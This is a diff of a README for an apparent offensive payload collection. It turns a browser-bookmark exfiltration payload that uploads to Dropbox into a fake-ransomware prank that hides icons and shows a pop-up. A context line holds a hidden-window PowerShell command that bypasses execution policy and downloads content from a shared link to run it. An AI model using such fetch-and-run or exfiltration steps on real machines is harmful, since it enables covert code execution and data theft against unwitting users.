@@ -1,8 +1,8 @@
-<img src="https://github.com/atomiczsec/My-Payloads/blob/main/Assets/bm-hog.png?" width="200">
+<img src="https://github.com/atomiczsec/My-Payloads/blob/main/Assets/WannaCry.png" width="200">
 
 <h1 align="center">
   <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+the;Bookmark+Hog!+😈&center=true&size=30">
+    <img src="https://readme-typing-svg.herokuapp.com/?lines=RanFunWare!+😈&center=true&size=30">
   </a>
 </h1>
 
@@ -19,24 +19,20 @@
   </ol>
 </details>
 
-# Bookmark-Hog
+# RanFunWare
 
-A payload to exfiltrate bookmarks of the 2 most popular browsers
+A payload to prank your friends into thinking their computer got hit with ransomware.
 
 ## Description
 
-This payload will enumerate through the browser directories, looking for the file that stores the bookmark history
-
-These files will be saved to the temp directory
-
-Finally dropbox will be used to exfiltrate the files to cloud storage
+This payload will hide all desktop icons, change the background, and have a message pop up (Fully Customizable)
 
 ## Getting Started
 
 ### Dependencies
 
 * DropBox or other file sharing service - Your Shared link for the intended file
-* Windows 10,11
+* Windows 10
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -55,6 +51,7 @@ powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the inten
 All contributors names will be listed here
 
 atomiczsec
+
 I am Jakoby
 
 <p align="right">(<a href="#top">back to top</a>)</p>
